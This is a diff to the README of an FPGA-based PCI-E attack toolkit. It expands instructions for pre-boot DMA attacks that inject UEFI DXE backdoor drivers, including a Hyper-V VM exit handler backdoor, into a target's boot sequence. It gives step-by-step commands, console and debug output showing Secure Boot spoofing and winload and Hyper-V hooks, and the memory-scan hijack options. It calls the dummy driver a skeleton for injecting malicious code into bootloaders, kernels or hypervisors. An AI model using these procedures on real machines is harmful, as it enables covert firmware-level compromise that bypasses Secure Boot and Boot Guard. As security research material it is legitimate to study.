@@ -403,25 +403,30 @@ print('%.2x' % dev.mem_read_1(0x1000))
 
 ## Practical DMA Attacks
 
-Python program `uefi_backdoor_simple.py` injects dummy UEFI DXE driver located in `payloads/DmaBackdoorSimple` into the target using preboot DMA attack. It's usage:
+One of the main goals of this project is providing flexible and convenient set of tools to perform so called pre-boot DMA attacks, in comparison with regular DMA attacks they are targeting pre-boot environment of UEFI DXE phase of the platform initialization rather than operating system itself. Such attacks allows to run malicious code at relatively early stages when [IOMMU](https://en.wikipedia.org/wiki/Input%E2%80%93output_memory_management_unit) and other security features of the operating system are not initialized yet. Also, pre-boot DMA attacks allows to effectively bypass such security features of the platform firmware as UEFI secure boot and [Intel Boot Guard](https://edk2-docs.gitbook.io/understanding-the-uefi-secure-boot-chain/secure_boot_chain_in_uefi/intel_boot_guard).
 
-1) Boot the MicroBlaze and connect SP605 to PCI-E port of target computer and Ethernet network. 
+Python program `uefi_backdoor_simple.py` injects dummy UEFI DXE driver located in `payloads/DmaBackdoorSimple` folder into the target system boot sequence using pre-boot DMA attack described above. To use this program you have to perform the following steps:
 
-2) Run the following command: 
+1) Power off the target computer.
+
+2) Connect SP605 board to the PCI-E (or Mini PCI-E, or M.2) port of the target computer.
+
+3) Turn the borad on and ensure that Microblaze firmware was successfully initialized by pinging an IP address that was specified during the board configuration with `bootloader_ctl.py` program. 
+
+4) Run the following command to start pre-boot DMA attack: 
 
 ```
-$ ./uefi_backdoor_simple.py --payload payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
+$ ./uefi_backdoor_simple.py -d payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
 ```
 
-3) Power on the target computer, in case of successful attack in couple of seconds you will see debug messages screen of injected UEFI driver.
-
-Example of debug messages on attack target screen:
+5) Power on the target computer, in case of successful attack after the couple of seconds you will see red debug messages screen of injected UEFI DXE driver:
 
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_simple.png" width="499" height="371">
 
-Example of `uefi_backdoor_simple.py` console output:
+An example of `uefi_backdoor_simple.py` console output after the successful attack:
 
 ```
+$ ./uefi_backdoor_simple.py --driver payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
 [!] Bad MRd TLP completion received
 [!] Bad MRd TLP completion received
 [!] Bad MRd TLP completion received
@@ -441,10 +446,12 @@ Hooking LocateProtocol(): 0xd67e2c18 -> 0x0001031c
 [+] DONE
 ```
 
-Python program `uefi_backdoor_hv.py` injects Hyper-V VM exit handler backdoor located in UEFI driver `payloads/DmaBackdoorHv`. Usage:
+This dummy UEFI DXE driver along with `uefi_backdoor_simple.py` program can be used as skeleton project to implement various attacks like injecting of malicious code into the operating system bootloader, kernel or hypervisor.
+
+There's also another Python program &minus; `uefi_backdoor_hv.py`, it injects Hyper-V VM exit handler backdoor located in `payloads/DmaBackdoorHv` folder into the target system boot sequence exactly in the same way as previous dummy UEFI DXE driver. Here's an example of its usage:
 
 ```
-./uefi_backdoor_hv.py --payload payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
+$ ./uefi_backdoor_hv.py --driver payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
 [+] Reading DXE phase payload from payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
 [+] Waiting for PCI-E link...
 [!] PCI-E endpoint is not configured by root complex yet
@@ -474,7 +481,60 @@ Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0bd4
 [+] DONE
 ```
 
-To get more information about Hyper-V backdoor usage check its [README](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/README.MD) file.
+UEFI DXE driver of Hyper-V backdoor is also displaying its debug messages on the screen. In addition, you can use `--debug-output` option of `uefi_backdoor_hv.py` to read this debug messages from the target system physical memory and print them into the stdout:
+
+```
+$ ./uefi_backdoor_hv.py --debug-output
+[+] PCI-E link with target is up
+[+] Debug output buffer address is 0x79db3000
+
+DmaBackdoorHv.c(1018) : ******************************
+DmaBackdoorHv.c(1019) :
+DmaBackdoorHv.c(1020) :   Hyper-V backdoor loaded!
+DmaBackdoorHv.c(1021) :
+DmaBackdoorHv.c(1022) : ******************************
+DmaBackdoorHv.c(1055) : Image address is 0xc0000
+DmaBackdoorHv.c(275) : BackdoorImageRealocate(): image size = 0x3260
+DmaBackdoorHv.c(1065) : Resident code base address is 0x79daf000
+DmaBackdoorHv.c(794) : Protocol notify handler is at 0x79daf364
+DmaBackdoorHv.c(819) : BackdoorEntryResident()
+DmaBackdoorHv.c(830) : OpenProtocol() hook was set, handler = 0x79db1477
+DmaBackdoorHv.c(835) : ExitBootServices() hook was set, handler = 0x79db1487
+DmaBackdoorHv.c(850) : GetVariable() hook was set, handler = 0x79dafa9c
+DmaBackdoorHv.c(855) : SetVirtualAddressMap() hook was set, handler = 0x79dafbc4
+DmaBackdoorHv.c(667) : new_GetVariable(): Returning fake value for "SecureBoot" EFI variable
+DmaBackdoorHv.c(667) : new_GetVariable(): Returning fake value for "SecureBoot" EFI variable
+DmaBackdoorHv.c(667) : new_GetVariable(): Returning fake value for "SecureBoot" EFI variable
+DmaBackdoorHv.c(447) : winload.dll is at 0x8ee000
+DmaBackdoorHv.c(448) : winload!BlLdrLoadImage() is at 0x984a10
+DmaBackdoorHv.c(477) : 535 free bytes found at the end of the code section at 0xa4ade9
+DmaBackdoorHv.c(527) : winload!BlLdrLoadImage() hook was set, handler is at 0x79daf50c
+DmaBackdoorHv.c(667) : new_GetVariable(): Returning fake value for "SecureBoot" EFI variable
+DmaBackdoorHv.c(350) : new_BlLdrLoadImage(): Path = "\WINDOWS\system32\mcupdate_GenuineIntel.dll"
+DmaBackdoorHv.c(350) : new_BlLdrLoadImage(): Path = "\WINDOWS\system32\hvix64.exe"
+HyperV.c(369) : HyperVHook(): Hyper-V image is at 0xfffff80144e0d000
+HyperV.c(388) : HyperVHook(): Resources section RVA is 0x1400000 (0x200000 bytes)
+HyperV.c(425) : HyperVHook(): Code section RVA is 0x200000
+HyperV.c(604) : HyperVHook(): Hyper-V VM exit handler is at 0xfffff8014502ad90
+HyperV.c(605) : HyperVHook(): Backdoor code size is 684 bytes
+DmaBackdoorHv.c(350) : new_BlLdrLoadImage(): Path = "\WINDOWS\system32\kdstub.dll"
+DmaBackdoorHv.c(350) : new_BlLdrLoadImage(): Path = "\WINDOWS\system32\hv.exe"
+DmaBackdoorHv.c(560) : new_ExitBootServices() called
+DmaBackdoorHv.c(711) : new_SetVirtualAddressMap()
+DmaBackdoorHv.c(752) : New address of the resident image is 0xfffff8014bbfc000
+```
+
+To get more information about Hyper-V backdoor use cases and features [check its README file](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/README.MD) with detailed information.
+
+Both `uefi_backdoor_simple.py` and `uefi_backdoor_hv.py` programs supports two different ways to pass execution to the injected UEFI DXE driver image:
+
+ * `EFI_SYSTEM_TABLE` hijack &minus; scan system memory down from physical address `0xf0000000` to `0` with `0x10000` bytes step in order to find EFI system table by its signature and patch `LocateProtocol()` function address. To override memory scan options you can use `SCAN_FROM` and `SCAN_STEP` environment variables.
+
+ * `PROTOCOL_ENTRY` hijack &minus; scan system memory up from physical address `0x76000000` to `0xa0000000` with `0x1000` bytes step to find `EFI_CPU_IO2_PROTOCOL` structure of [CPU I/O 2 protocol](https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/CpuIo2.h) and patch one of its functions. To override memory scan options you can use `SCAN_FROM`, `SCAN_TO` and `SCAN_STEP` environment variables.
+
+By default both programs are using EFI system table hijack method, to use protocol entry method instead you can pass `--inj-prot` command line option to the appropriate python script. To reduce amount of time required to perform the attack you can specify previously found `EFI_SYSTEM_TABLE` structure address using `--system-table` option and `PROTOCOL_ENTRY` structure address using `--prot-entry` option. Also, both `uefi_backdoor_simple.py` and `uefi_backdoor_hv.py` programs has `--test` command line option, this option is used to do the memory scan and find required structures addresses without performing an actual hijack of the execution flow.
+
+During development of malicious code for pre-boot DMA attacks it's important to have an information about execution environment of UEFI DXE phase. To collect such information you can turn the target computer on, enter into the BIOS setup menu or boot options menu to pause loading of the operating system and run `uefi.py` program without arguments. This program will scan physical memory of the target computer and print various information about existing UEFI DXE protocols and interfaces, loaded UEFI drivers, UEFI descriptor tables and ACPI tables. Here you can see [an example](https://gist.github.com/Cr4sh/206daf97b57c050392415616a30c3ca9) of information obtained by `uefi.py` program while using [AAEON UP Squared](https://www.aaeon.com/en/p/iot-gateway-maker-boards-up-squared) mini-PC as attack target.
 
 
 ## Option ROM Attacks
@@ -514,7 +574,7 @@ PCI Express is very complicated high speed bus so there's a lot of things that c
 
 * `DS5` LED is on during PCI-E bus reset, when it always on it means physical connectivity issue.
 
-* If root complex sends Cpl TLP instead of CplD TLP in reply to memory read request it means that memory access was rejected because of invalid address or IOMMU enforced access cheks. Also typical x86 machine might not reply at all on memory read requests to some certain physical address space regions. 
+* If root complex sends Cpl TLP instead of CplD TLP in reply to memory read request it means that memory access was rejected because of invalid address or IOMMU enforced access checks. Also typical x86 machine might not reply at all on memory read requests to some certain physical address space regions. 
 
 * If software receiving inconsistent or invalid TLPs from root complex in reply to memory read requests you might try to set a smaller value of `MEM_RD_TLP_LEN` constant in `pcie_lib.py` to split reply data into more smaller chunks. Also it's useful to run the program with `DEBUG_TLP=1` environment variable and check raw TX/RX TLP dump.
 
